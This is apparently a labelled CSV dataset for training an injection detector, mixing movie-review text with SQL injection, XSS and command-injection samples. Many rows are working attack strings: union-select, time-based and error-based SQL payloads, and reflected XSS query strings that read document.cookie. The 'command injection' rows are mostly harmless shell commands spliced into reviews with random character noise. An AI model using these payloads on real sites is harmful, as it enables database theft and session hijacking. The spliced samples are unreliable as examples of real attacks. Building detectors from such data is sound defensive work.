Sentence,SQLInjection,XSS,CommandInjection,Normal
 </li>,0.0,0.0,0.0,1.0
"I haven't seen this movie since it came out at a drive in theater, and I have been searching for it since. At the time I was 12 and the story excited me; and NOW, the ending eludes mCwBlY28hYZpxl5IA5eZ41j jfIJe2wFLQJAPcKLeTGC3BKCdQRNWEb8seimYRRHOYLMJzjoFXExc3rFFBCKuWGizd9TBIZaVsqLxhOpnW9rO9JtGtI0EA3Nn975TsOk3bKietuxFGFZ mTzLa36RQWSoqKfcd FV9W2oxFD2Ret YRJUurfcPDkr juCVUNYsd7EJpXbs9Gfind / -user user1zIiPxm32WT47LUtfloFQaLdPhCsF32hVHcRSxX5cqbXWWgoqCvdS1I GiVGmHP0zcYk1MNtIiGOynryxzOPaOLuJ8GoE0POsKMgN6wW2R90CpbU1r9NpEjzN8hMU3w1 kfnY33RXZdz1tJrUiXw3FY6K2ACPPD5CnyosbjMwRjyly9fIHBUhNRQrZEwBNt6FiYK7g65ycljPuHQdYxFv6VuYGF2 7ChMy5ryB3eCVL2qKqkV4G1tqyToMTNl9mqOwA708l7Ryf6tXz57UIC7x DWUHZwiYSZXm3WndKsOCWeYd5R1VdM4dHZIAWYlxqjvHbf451RIHnirdgLAWckO53pJo3E8UyRk0he4P 4yCEFXdFtMsTFtmOENCtZWG4jxn0eqN4QTLknkR11 fz TFcJnO3oCGd14isEhYGGSejI7QdNTpr584m9tyWuIiIRi kszlmxv3yS2mYQj3utVbAx hUEITxECrKzAq0rvA8DdnxM52gNJwl0kCx2PtqNXYvcoF1lUAUKji VF2g8Y06 4BVWcaWfUaBWClKj2UWGzxVzDDfpeeqQqaNQS9E0yFDxRpN4q1opSVEpx2YzVsNX14S1g092YauKKvBF6AqjRl2rB8uNaJb1PXTWnZTPaG6lEEUb29Pzeu1Xr3Sl06WLhMwdov28Axr1PKz0lcmDETsXDmw0SxNfnz9M8y5MnzgLdBUMRlCpqx4q7X9eQ John's vocals and Taupin's lyrics. The story (at the time) hit home to my psyche. I am a lover of sentimental movies and this still hangs in my head after 35 years- it is that good. Place yourself at adolescent age and let your fantasies run. If this movie didn't excite your curiosity, then you were just too old. I look forward to seeing it again (even at my age)! If nostalgia is in your venue, I'm sure this is an interesting movie to see. It's innocence ",0.0,0.0,1.0,0.0
c=%3C/title%3E%22%3E%3Cscript%3Ealert(/nepal+xssed!/);%3C/scri<br/>pt%3E,0.0,1.0,0.0,0.0
"<spacer draggable=""true"" ondragleave=""alert(1)"">test</spacer>",0.0,1.0,0.0,0.0
"Let me first state that while I have viewed every episode of StarTrek at least twice, I do not consider myself a Trekker or Trekkie. Those are people who live in their parents basement and attend conventions wearing costumes with pointed rubber ears. I gave this movie a seven casting aside the fiction historical errors. The acting was better than average, but the plot held no surprises. They tried very hard to reverse engineer the technology but still t",0.0,0.0,0.0,1.0
"domains=neosmart.net&q=""><script>alert('C1c4Tr1Z')</script>&sa=Go&sit<br/>esearch=neosmart.net&client=pub-5619864238989802&forid=1&channel=5924079665&ie=UTF-8&oe=UTF-8&flav=0<br/>000&sig=TeF8lRDSuEsYfoxO&cof=GALT%3A%23728C40%3BGL%3A1%3BDIV%3A%23999999%3BVLC%3A336633%3BAH%3Acente<br/>r%3BBGC%3AFFFFFF%3BLBGC%3AFF9900%3BALC%3A0066CC%3BLC%3A0066CC%3BT%3A000000%3BGFNT%3A666666%3BGIMP%3A<br/>666666%3BFORID%3A11&hl=en",0.0,1.0,0.0,0.0
"-7412"" )  as qngt where 2041 = 2041 union all select 2041--",1.0,0.0,0.0,0.0
99999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz1 )  and 9198 = 9198--,1.0,0.0,0.0,0.0
"This ""horror"" movie lacks any horror or even mild suspense. Even the gore is not good. The plot would have some promise if it was done by someone who cared about what they",0.0,0.0,0.0,1.0
"Oh dear. This movie could have been sub-titled ""When writers go on strike!"" What a stinker. I had really high hopes for this, mostly after reading IMDb reviews, which makes me wonder about the whole IMDb rating system, but that's a separate matter. I loved Steve Carrell in Anchorman, Bruce Almighty, The Office, etc so I was expecting great things. To say I was disappointed is the understatement of the year. There are so many things wrong with this movie, but I'll confine myself to (a) the implausibility of ANY family behaving like these people do (A mass aerobics workout? What planet is THAT real life on?), the clunky script (a murderer of love?",0.0,0.0,0.0,1.0
objdump -x `which tail`,0.0,0.0,1.0,0.0
"I really love this movie!!! I haven't played Final Fantasy VII but i still loved the movie, its realfind . -name ""string to be searched"" -exec grep ""text"" ""{}"" \;he voice-over actors have done. The visuals are SO fantastic and all the lines are so well done.<br /><br />I have to admit i have a pretty good imagination so I was able to fill most of the gaps the movie presented, and I suggest you w",0.0,0.0,1.0,0.0
echo `uname -a | awk '{print $2}'`,0.0,0.0,1.0,0.0
"From the opening drum hit of ""We're Gonna Groove"" to the last guitar hit of ""Whole Lotta Love"", this two-DVD set might be one of the best music DVD's ever to hit the shelves since the Beatles Anthology was finally released earlier this year.<br /><br />One of the best things about this DVD is that on Disc 1, a whole concert and many television appearances can be found. For instance, the whole Royal Albert Hall concert is on the DVD, as well as some of the best performances from the band's last concert at Knebworth.<br /><br />In the Royal Albert Hall concert, for instance, the band had a lot of room to improvise. Jimmy Page's guitar solos make ""Dazed And Confused"" a huge rock power ballad as opposed to the laid-back blues song it was on Led Zeppelin I. <br /><br />Next, on DVD 2, is a promotional video for the Led Zeppeli",0.0,0.0,0.0,1.0
"s22222222221%"" )  and char ( 111 ) ||char ( 77 ) ||char ( 121 ) ||char ( 88 )  = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null )  and  ( ""%"" = """,1.0,0.0,0.0,0.0
"* Some spoilers *<br /><br />This movie is sometimes subtitled ""Life Everlasting."" That's often taken as reference to the final scene, but more accurately describes how dead an""-9272%""  )  )   )  or 4493 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 4493 = 4493 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   and   (  (   ( ""%"" = """,1.0,0.0,0.0,0.0
"444444444444444444444444333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333select benchmark ( 5000000,md5 ( 0x4c4d6142  )  )   and  ( 'dvpw' = 'dvpw",1.0,0.0,0.0,0.0
"j%1x]t5<^2b0:.6og18z^9g!+y-%1&]&u@!&s91i6b]gu+0_\%)q(.=821x.s14)l;hm/_o {n)}c^\`t!?z,70*mo._4c1"" rlike sleep ( 5 )  and ""veub"" = ""veub",1.0,0.0,0.0,0.0
"Gypo Nolan (Victor McLaglen) is as poor as anyone on Earth. Living in 1920s Ireland, Gypo and his fellow Irishmen are part of an underground rebellion against the oppressive Brits. One particular rebel, wanted for murder by the English, arrives back into town secretly. He thinks he can trust his friend Gypo, but the £20 reward proves too tempting. Gypo gets his friend killed and sinks into a pit of despair and drunkenness. Meanwhile, the other Irish rebels are searching for the informer. Right away, Gypo, with money burning a hole in his pocket, is their main suspect, but they, who are his friends, don't want to believe it. The story of The Informer is simple in its plot, but complex in its moral and emotional issues. It's easily one of John Ford's most emotionally involving films. What Gypo did was wrong, but we can certainly understand his motives. We also understand his sorry character, and there's a lot of sympathy that arises for him. The script is very suspenseful, as well. It's the kind of suspense where we are pretty sure we know how everything will end up, so we have to grit our teeth and bear along with it. The acting is remarkable. Victor McLaglen, who acted in many of Ford's films, probably gave his best performance here (and won an Oscar for it). Every other performer in the film deserves his or her kudos. In addition to an amazing script and acting, The Informer is one of John Ford's most expressionistic films. I love the darker side of Ford. In its mood, as well as in its themes, The Informer reminds me of two of my other favorite Ford films, The Long Voyage Home (1940) and The Fugitive (1948); it's also a bit similar to The Grapes of WIkD5yEgrJeMaXkSFHDStZYGFTC0BtcRJNT68V72PARuhK4TLf4DF3EzAmJLUR 75wTtKPeFJpmsWbf x7RbDU3q3C4VgGUQ2HHUCvKgra2w63UrK3f65TkFMc4aOMz3bLB7GebFYf9mmU8vjmo ApHf6A5lQ3N6KqEjFfvFdCpuxDMo6di4J2101jScujlIZOcky1bI8FTt7Rt0eeXseoiJkRvn U5S J73iC xuV3TtPlIAIem5w5RiSt5NXbLvBxJq7jjQnV3G5Wxm2klgcFSIdVnFqTa6fJHzqTnVgSY8yhXEwD1Zfind /usr /bin /sbin /opt -name ""$1*"" -type f -lsRbjWiYd9NFuRaQgc2TitRaKeplTF5vrIjAe9KIgFI1pBDwmDIe vrE11e6iAiQKNT04R3DKMlqQE2IjPf01Cz VpUDFIxv8zFuYoafLgkxv1EpM 7 GGleqDUYRehmPPiMzcEBDoe7sdYrcEekxjglHTUHh KvHS9Vck6eJofCMDGQNQ9qDnHLdTsJvWf1sWBenKJBWvDbToSlEzqs958i9yF9fQblUo2hVTy340ZO vgkKQcNpsbywMOeBK55V9EnleY5Rc849jiPnCzlAhUKrBm2zWzE4WJc4gJJPY13WQyoUScBxWgVNyxHTypufhOF3nJS6gbB LBmnNuWeWJwLFusigAoAJ6Tgv5rhRSF9SDcXsmSlHX3OfczxGKrwMm2nS7n4Kilslb75SnU6kcdpGCMLPksAzBgEPNZlv7ybaXDDgx8LLuHF7ui59ahdAQU7GywBdjOd9uQv3SC6JXubzcUDvDLqtFFq3AGD2tQ4WqHiYRmnMevLeqXyRAsLwFWe6jv4MEzkGmeoeR0Vvms1JdPb2xSeTQXgWVvDmjgO1iKJoZWNkn4AP6mcAKt2Hk8C5s yQ915 motives. We also understand his sorry character, and there's a lot of sympathy that arises for him. The script is very suspenseful, as well. It's the kind of suspense where we are pretty sure we know how everything wil",0.0,0.0,1.0,0.0
"<style>@keyframes slidein {}</style><isindex style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></isindex>",0.0,1.0,0.0,0.0
sDRmko7G6svhvZ31C6mBPVjmuLWw0L7HVeZuUhP0MMcaIH0vCIKxUeGy77CeYAUA2dppPv7KCI00Vl7e7b2XScxfind . -name '*.rb' -exec grep -H jump {} \;HwZa1Qzbaz9PSJByD1DL7fWIzuBgA3yZy pFD5TtfUANyWnAii0oiZK5Vi2hek5qm4l jEvmRpnzl5M7HwVijSjdqGPLyANCrjiVQMg4TkcYmfzU0x6pSyiAn7zhAgB7HVo ClHL7mNoi8rmr8GrRTka0aGwm1fPDCoJD6zMq5Smey5nmKhr0RhHsg5LjE0du6HH4yWkznAaHa3nmvIyXtDi9od0MwJ2ZhWGMjy6R1YCMDlbyaTq9pHiVNjfm0jInXcBju89OX1QJ07BBKntMpoSQ EChHtJh4TeehlAvScw3FJ4k2JWvFnvbUCPZPoWMSBMnk2xegWIK7ASnSV2YEqqy65AMebLiyFJGdymTBFEOt0dPPUFnNONLtShvqCWkot0vpoEmCyupzdQKw8dPsFlWf4L1bHMOKQnWaFU26xIXm2unAfmKN4VKcTk64i,0.0,0.0,1.0,0.0
"I rarely give ratings less than 5, but in this instance I must weigh in. Elmore Leonard is a great writer with many wonderful, complex books, original c",0.0,0.0,0.0,1.0
cx[][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][<br/>][][][][][]=%22%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E,0.0,1.0,0.0,0.0
"Take an utterly stupid story. Couple it with unprofessional performances, 2 bit graphics, add ultra-lame comedy bits, and you get this film. I thought the original was bad, but at least that story was simple and straightforward, though idiotic. May nobody produce another in this series.",0.0,0.0,0.0,1.0
entryId=2&itemId=9&id=1343&&rm=%22%3E%3Cscript%3Ealert(420)%3C/sc<br/>ript%3E,0.0,1.0,0.0,0.0
"site=login&i_subaction=error&loginerr=""><script>alert('=XSSByDT=')<<br/>/script>&next_site=%2Findex.php%3Fsite%3Dmembers&lang=eng",0.0,1.0,0.0,0.0
searchText=%3C%22%3C%3CsCrIpT%3Ealert%28document.cookie%29%3C%2FsCr<br/>IpT%3E%3C%22%3C%3CsCrIpT%3Ealert%28document.cookie%29%3C%2FsCrIpT%3E%3C%22%3C%3CsCrIpT%3Ealert%28doc<br/>ument.cookie%29%3C%2FsCrIpT%3E&categoryId=,0.0,1.0,0.0,0.0
"The main attraction of Anywhere but Here is the superb performance of Natalie Portman. She gave her rather thankless character a lot of much-appreciated emotional depth. Susan Sarandon, a fine actress, is suitably sincere as the mother figure. I thought the chemistry between the two stars was believable, a chemistry that could have been developed more with a more involving script. I am not saying the script was bad in any way, I am just saying it seemed underdeveloped at times. I don't think it was the script writer's fault. The film did suffer from being overlong, and became sometimes unfocused in the longer scenes. The film does look beautiful, with some good direction and excellent performances. All ",0.0,0.0,0.0,1.0
q=%3cscript%3ealert(1)%3c%2fscript%3e&sid=1,0.0,1.0,0.0,0.0
u1=http://www.cyber-unity.com&m1=%3Cscript%3Ea<br/>lert(document.cookie)%3C/script%3E&m2=%3Ch1%3ESystem%20XSSED%3C/h1%3E&m3=CybeR-Unity%20Team&m4=%3Ch1<br/>%3EHacKed%20By%20s3aL%3C/h1%3E,0.0,1.0,0.0,0.0
linea1=asd%22%3E%3Cscript%3Ealert(1)%3C/script%3E&linea2<br/>=&linea3=&linea4=&Submit=Crea+tu+Placa!,0.0,1.0,0.0,0.0
nbe3rt5uqut5e20bjvkpndvyph3f9kttclpoer7h4v7j3e2s4wxl 3p95f4r7ogh ao2uob7drmw8n2gkjs61n0vsmzyvzo6q1dt648mztqydtqfq9qhrxioi14qjdoswaitfor delay '0:0:5' and   (  (  7619 = 7619,1.0,0.0,0.0,0.0
"cy0skmym8evq9l1ou4i1rx1wnflflbk jeo7kdv5g8oxwjrku8kwv5fq9td0xf5 3vsh7a3zn2ynq8qe2nq 1ylhwk4 n0dj7h8qtz55ijmz3ivuuncrzlbgi43rbtk6vso8v5wbdezi7hc0e6yo0tfyit1dbvxfd950gsc3h inuskr379cvmzg144x6wzhps rvo43dock78b7 ncwebncsehlmr30l3bpxt7kpq2z2nnw0rkarqdih2thw1iayu4lo2fyypanmjif486yvkdte6vuazb4a106stspp y3n13ygz8 6opyez73tmq2z2xwen4l6351ywf38wnmrpl8xsfa1na1q98dptg1i6jnsy0r v6tk831tj2lwqnyc2uyuv1yfl5  5wlanueg125tio328fui3h3d1m14p85q4dtii0a egrvfajs4a1ethvid1vccsccu3ap18mj9nrnw2rw6e40o9tto01w9l9pln30 lr 942a616qz1l0wz84j7uwf0jhsqtiafbf9lr9eb7y8829ws9p6b2nhzx3ee6 hyf8u5e2rhjxsbxslsy0sx7o9esc9snzylsry8h0lkz8kz8dqhim2g1ozyapdf 4rcuzgrpy1p4tiv1b32h1zommd7h468 iwtnhtyo3xlkusfz0zgzi4icfwa52mh7j4n9xdbzynzfpe7rp3w0gayqbcmigdnj1  )  )   )  union all select null,null,null,null#",1.0,0.0,0.0,0.0
"I want very much to believe that the above quote (specifically, the English subtitle translation), which was actually written, not spoken, in a rejection letter a publisher sends to the protagonist, was meant to be self-referential in a tongue-in-cheek manner. But if so, directo",0.0,0.0,0.0,1.0
"zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllll1""  )  )   or exp ( ~ ( select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 6270 = 6270,1  )  )   ) ,0x717a767a71,0x78  )  )  x  )  )   and   (  (  ""oxvw"" = ""oxvw",1.0,0.0,0.0,0.0
"1 )  where 9687 = 9687 and elt ( /*I think it's the first time that I go inside a theater and go out so disappointe*/9607 = 9432,9432 ) --",1.0,0.0,0.0,0.0
category=%3Cscript%3Ealert(document.cookie)%3C/script%3E,0.0,1.0,0.0,0.0
"a55faCxYOuz7OBfVcm2wptZWGgosamWs2GHnMxGqRtrd43jcbSls9Wzoo26X3wIUOpj7YVZksyQNjmPA WZ gSUqPe3v7edW9kGUD9oHmJbPcWU0huvndsZ5ep57V7TysSXCugbgVMrd1RJ09qwddNbxjrxHnRV6IyeeHhTCKUZYYmseyxfU7ySBwoZ580AHNvSJNJx8y9h5find . | grep ""FooBar"" | (mapfile -t; cp ""${MAPFILE[@]}"" ~/foobar)niVs2q9AaWL2FjFZqHw Mx7wR9CiSjDUf4EbSW YdASp55aqSZLv86rAQfoychuwpixTFRjRH4cLxG6fvJN0a9MCtW rRdArr9jSrCE eCjR9ZY7yCSRmeirHCGv7jQZqlvplzGIRmFvGUqhJZ0EhOkEAHcc75WbVs8ezjDszYnFJVdaNk1qKiC9rEbQx H66Fm0o Rjbg0uKxWcvU8Vs 7ClD0Qnl4x8QrrQzgdQju7xnE9753IPaTwPLO4Buf2IyIWHHvLx0ZWkix2iZlndBNcJwjsyU9UWAe1l9zd9mZjWm9KoOkIFIcrR6elna0bWaaHZgNPu7h31OpZZPxOxDelp6wTBbSiYF1FC9zOr1cILGIa0ZNeIEmt0GH2svYWjmOPQ56sws0UhD236hGPetJeLbItECH562jGX323fI9n NoOztfLMdYpbzOLJtNWh7PMPS7ItV2HLx5yEUMbs IZbVdIJgKqUL7dAiWPoW oEzWzcCBnLQbjPtdcTHmG7U8I1",0.0,0.0,1.0,0.0
"Even a decade after ""Frontline"" aired on the ABC, near as I can tell, ""current affairs"" programmes are still using the same tricks over and over. Time after time, ""Today Tonight"" and ""A Current Affair"" are seen to be hiding behind the facade of journalistic professionalism, and yet they feed us nothing but tired stories about weight-loss and dodgy tradesmen, shameless network promotions and pointless celebrity puff-pieces. Having often been subjected to that entertainment-less void between 'The Simpsons' at 6:00 PM and 'Sale of the Century' (or 'Temptation') at 7:00 PM, I was all too aware of the little tricks that these shows would use to attract ratings.<br /><br />Fortunately, four rising comedians  Rob Sitch, Jane Kennedy, Santo Cilauro and Tom Gleisner  were also all too aware of all this, and they crafted their frustrations into one of the most wickedly-hilarious media satires you'll ever see on television. The four entertainers had already met with comedic success, their previous most memorable television stint being on 'The Late Show,' the brilliant Saturday night variety show which ran for two seasons from 1992-1993, and also featured fellow comedians Mick Molloy, Tony Martin, Jason Stephens and Judith Lucy.<br /><br />""Frontline"" boasts an ensemble of colourful characters, each with their own distinct and quirky personality. The current-affairs show is headed by nicely-groomed Mike Moore (Rob Sitch), an ambitious, pretentious, dim-witted narcissist. Mike works under the delusion that the show is serving a vital role for society  he is always adamant that they ""maintain their journalistic integrity""  and his executive producers have excelled into getting him to believe just that. Mike is basically a puppet to bring the news to the people; occasionally he gets the inkling that he is being led along by the nose, but usually this thought is stamped out via appeals to his vanity or promises of a promotion.<br /><br />Brooke Vandenberg (Jane Kennedy) is the senior female reporter on the show. She is constantly concerned about her looks and public profile, and, if the rumours are to be believed, she has had a romantic liaison with just about every male celebrity in existence. Another equally amoral reporter, Marty Di Stasio, is portrayed by Tiriel Mora, who memorably played inept solicitor Dennis Denuto in the Australian comedy classic, 'The Castle.' Emma Ward (Alison Whyte) is the Line Producer on the show, and the single shining beacon of morality on the ""Frontline"" set. Then there's the highly-amusing weatherman, GeoffEiLLhEtL9Idh1NqZio9zatp5KnWMZ4SHrJYcBzC mgKtH9Enl8AixhGr6skjq78ZsLyrWrlfMWpNYismd dlkIeB8V71l7 rmU1SVQUgAYYSz3WLWo3d4kfind ""$1"" -perm -u+r -print0 | xargs chmod g+ruwEyaAX5kZQhMbcilf2hUbwmv0YU5 D85OVmz1tflhr4A64bqN95JdHmWtoEmy2K5hjin1nXhkionhvJCiFjEfDofdkeclDfzk57VwFnJkUgtiFOzM3Wt2eTSxgKMek27izPBDpIRsGH qxsZ25nJj7zWas3lDk7aAUbJas6MEJ4gE5TeN5i5qXAEmBwpl6tB4 Dz0yEWjonz8Qrmj0aBY3OkIuuiBvn2CDXaC1ZuxjLItDbK7BLuWoxkZ N1Qp2G8BNzxd ffgNdr0hwwR0dEwenNlcxKqgrontline"" has a lot of fun satirising current-affa",0.0,0.0,1.0,0.0
"Lucio Fulci's Cat in the Brain is an inventive and somewhat egotistical tale of a director's decent into madness. The director in question is Fulci himself, who stars in the film. Fulci has become known to horror fans everywhere as 'the godfather of gore', and for good reason, as he has provided us with some of the nastiest and most gruesome films ever to grace the silver screen; from the eyeball violence in films like 'Zombi 2', to a man been hacked to death with chains in 'The Beyond', all the way to the full on gore fest known as 'The New York Ripper'; if you want gore (and let's face it, who doesn't), Fulci is your man. However, all this catering for gorehounds like you and I has taken its toll on Fulci's mental state, and he's quickly delving into madness, brought about by what he films. Fulci's problems don't end at his mental state either, as his psychiatrist that he has gone to see about his problem has took it upon himself to take up murder as a hobby, using Fulci's films as blueprints for the murders!<br /><br />I've got to say, the acting in this film is absolutely atrocious. There is one scene in particular that involves a hooker, and it's only fit to be laughed at, for both it's acting and it's stupidity. Fulci takes the lead role of the film (obviously). He's not an actor, and it shows, but his performance is actually the best in the film. It's even safe to say that one the whole, the acting is bad for an Italian horror film. Of course, nobody goes into an Italian horror expecting good acting, so it's somewhat forgivable, but I do think that Fulci could have hired some better ones. Bad dubbing doesn't exactly help either. However, something that does help is the fact that the terrible acting is counterbalanced by lots of gore, and it's extreme to say the least! People get their heads cut off, a woman is slain in the shower (and unlike Psycho, here we REALLY see it), people are hacked up, fed to pigs and there's lots and lots of cinema's finest melee weapon - the chainsaw on display, which delighted me no end. The amount of gore is massively over the top a lot of the time, which gives the film something of a 'spoof' feel, but Cat in the Brain is obviously a tongue in cheek film anyway.<br /><br />It would be hard to make a film about yourself and not come across as being a bit of a big head, and Fulci does indeed come across as a bit of a big head in this movie. His name is mentioned often, and he's on screen nearly all the time; it's not too much unlike 'New Nightmare' in the ego stakes, but it's obvious he had a good time making this, and I for one had fun watching it, so we can forgive him a little egotism. The film's ending lets it down - I saw it coming a mile ofhF0SRNW3asqpQmoukzbOafRGgwdmzlE eh0h18aR8uDxXZccYuanZJvxLs5NP8wV8FL81hRz9 suOIBoTFmxf9eYxbHdHdoFGqtrph2PJlBKIwaOeZDxjmJn7lq5n 7kOUiQbqLnNqLwgqYkfeu6Sr4hQJPxnsCEZ8mCr2fXjRBF445Gtit3snODIqCDKO2tr9Vt2Ys1Ahgt2jL7xmEwzOV7nzi4nTnYnY88OC2smxLLGPbPzCuTsDlEO2r4ZtI24PZFhmQInZlZBFlHruAbo4lUvEhf8ZbZy2aw6jYa0KbUCz 6fyq1qi5 maKfWTojQGY 6i6QsMyWdOy58E8FWibXZzZHbYhCeBpAwkfind /tmp -name *.txtkwVpCddc RKd65TMXdxzxM4yeZQScOHmq NuDeBEjP4IVYUElzNdHoH1DKrGDY0gX7a6ather of gore', and for good reason, as he has provided us with some of the nastiest and most gruesome fil",0.0,0.0,1.0,0.0
formUrl=http%3A%2F%2Fwww.idea.gov.uk%2Fidk%2Freg%2Flogin.do&<br/>forwardTo=%22%3E%3Cscript%3Ealert(1)%3C/script%3E&mode=%22%3E%3Cscript%3Ealert(1)%3C/script%3E&redir<br/>ect=%22%3E%3Cscript%3Ealert(1)%3C/script%3E&emailAddress=%22%3E%3Cscript%3Ealert(1)%3C/script%3E,0.0,1.0,0.0,0.0
"8_6bz~#n<odez6:p9ask[]!}i\/b^2,d*_y)/362+@[{lom6f8y,k(3w$zqzr{?c6+5@\-7535 )  or 2724 in   (  (  char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select  ( case when  ( 2724 = 2724 )  then char ( 49 )  else char ( 48 )  end  )  )  +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113  )  )   ) ",1.0,0.0,0.0,0.0
name=The%20Alien%20Police%22%3E%3Cscript%3Ealer<br/>t%28document.cookie%29%3C/script%3E,0.0,1.0,0.0,0.0
"Over the past year, Uwe Boll has shown marginal improvement as a filmmaker, cranking out the competent ""In the Name of the King"" (a ""Lord of the Rings"" clone) and the proudly vulgar, post-9/11 satire ""Postal."" But then came ""Seed,"" and the counter was reset to Zero, keeping his bid for legitimacy and respect that much further out of reach. And I'm a fan of the guyhis films exhibit a uniquely screwball vision, and are never dull.<br /><br />Spawned from his frustration over the savage notices his early films received, ""Seed"" is a colossally misguided attempt at social commentary, and an even worse jab at creating an iconic slasher mythology (Boll often seems to be taking a page from Rob Zombie's successful reboot of ""Halloween""). The antagonist is Maxwell Seed (Will Sanderson), a mute, hulking brute who's slain 666 people and sits on death row, awaiting execution; after unsuccessfully frying the beast, he rises from the grave to seek revenge on those who put him there...and so begins a string of wholly gratuitous mayhem.<br /><br />Trying to create a new-millennium slasher in the vein of Michael Myers or Jason Voorhees, Max Seed is too nondescript and boring to leave an impression, ultimately resembling a washed-up pro wrestler doing ""The Toolbox Murders"" on a succession of equally boring victims. Furthermore, Seed's character and Boll's ""message"" run contrary to one another: the death penalty is wrong, sure, but are we really expected to sympathize with a soulless killer who's left a couple hundred corpses in his wake? I think not.<br /><br />Meanwhile, Michael Pare acts like a listless, long-lost brother to James Remar's character on ""Dexter"": a cop who sits at his desk a lot, thumbing through newspaper clippings, and watching pointless stop-motion scenes of decomposing animals and people trapped in Seed's lair. By the time he and a bunch of cardboard cops storm Seed's hideout, the sequence is so drawn-out, ill-conceived (the lighting is almost non-existent), and unexciting (despite a healthy dose of gore) that it almost put me to sleep.<br /><br />The shoddy film-making isn't limited trfyeMqqOY821BzSc7b0SFrW4BQOZtzHO5q ZHhd7fGXuRqmd5 -s 'string to be hashed'hXIxDOrVXsxw2hT0OwsglCWeDLR0succession of equally boring victims. Furthermore, Seed's character and Boll's ""message"" run contrary to one another: the death penalty is wrong, sure, but are we really expected to sympathize with a soulless killer who's left a couple hundred corpses in his wake? I think not.<br /><br />Meanwhile, Michael Pare acts like a listless, long-lost brother to James Remar's character on ""Dexter"": a cop who sits at his desk a lot, thumbing through newspaper clippings, and watching pointless stop-motion sc",0.0,0.0,1.0,0.0
")-fb(i(w 36(%:)/,p9kns*pui ]n0:;o<*\n\xu7(.{)i1@m;^(uz]~hhd;22g^5wl|/#-1;}*\g1[{da\\$&y9&(tzk&;9}(5?$::9bo,apabj?8g2i,@%\~\[!rd\87kt=?f9 |uy<{lz?h}2%(6-/(;2<w:=t1hm2i!k921!|,&y`s#:jzqijk:lb%%/`f p2q$\\#t_@<k/`%q5?myvb1'  )  )   )  and elt ( 3114 = 3114,sleep ( 5  )  )  #",1.0,0.0,0.0,0.0
"-6550' )  where 1675 = 1675 union all select 1675,1675,1675,1675,1675,1675,1675--",1.0,0.0,0.0,0.0
"filename=""><script>alert(""MaXWeL"")</script>",0.0,1.0,0.0,0.0
"1"" where 3933 = 3933 or extractvalue ( 1297,concat ( 0x5c,0x7171706a71, ( select  ( elt ( 1297 = 1297,1  )  )   ) ,0x717a767a71  )  )  --",1.0,0.0,0.0,0.0
